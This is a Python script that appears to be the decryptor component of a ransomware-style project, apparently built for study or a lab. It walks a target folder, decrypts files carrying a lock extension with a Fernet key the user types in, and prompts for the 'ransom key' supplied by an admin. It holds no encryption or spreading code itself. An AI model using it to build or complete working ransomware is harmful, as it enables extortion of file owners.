import os
from cryptography.fernet import Fernet
from Config import CARPETA_OBJETIVO, EXTENSION_BLOQUEO

def restaurar(llave_string):
    try:
        f_obj = Fernet(llave_string.encode())
        
        for raiz, _, archivos in os.walk(CARPETA_OBJETIVO):
            for nombre in archivos:
                if nombre.endswith(EXTENSION_BLOQUEO):
                    ruta_c = os.path.join(raiz, nombre)
                    ruta_o = ruta_c.replace(EXTENSION_BLOQUEO, "")
                    
                    try:
                        with open(ruta_c, "rb") as f:
                            datos_descifrados = f_obj.decrypt(f.read())
                        
                        with open(ruta_o, "wb") as f:
                            f.write(datos_descifrados)
                        
                        os.remove(ruta_c)
                        print(f"Restaurado: {os.path.basename(ruta_o)}")
                    except Exception as e:
                        print(f"Error al descifrar {nombre}: {e}")
                        
    except Exception as e:
        print(f"Clave inválida o error general: {e}")

if __name__ == "__main__":
    key = input("Introduce la clave de rescate entregada por el admin: ").strip()
    if key:
        restaurar(key)